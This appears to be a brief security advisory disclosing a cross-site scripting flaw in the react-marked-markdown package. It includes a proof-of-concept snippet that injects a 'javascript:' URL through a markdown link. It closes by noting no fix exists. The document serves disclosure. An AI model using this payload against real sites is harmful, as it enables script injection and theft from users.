  Cross-Site Scripting in react-marked-markdown
  All versions of `react-marked-markdown` are vulnerable to cross-site scripting (XSS) via `href` attributes. This is exploitable if user is provided to `react-marked-markdown`

  Proof of concept:

  ```
  import React from 'react'
  import ReactDOM from 'react-dom'
  import { MarkdownPreview } from 'react-marked-markdown'

  ReactDOM.render(
  <MarkdownPreview
  markedOptions={{ sanitize: true }}
  value={'[XSS](javascript: alert`1`)'}
  />,
  document.getElementById('root')
  )
  ```


  ## Recommendation

  No fix is currently available for this vulnerability. It is our recommendation to not install or use this module at this time if you allow user input into href values.
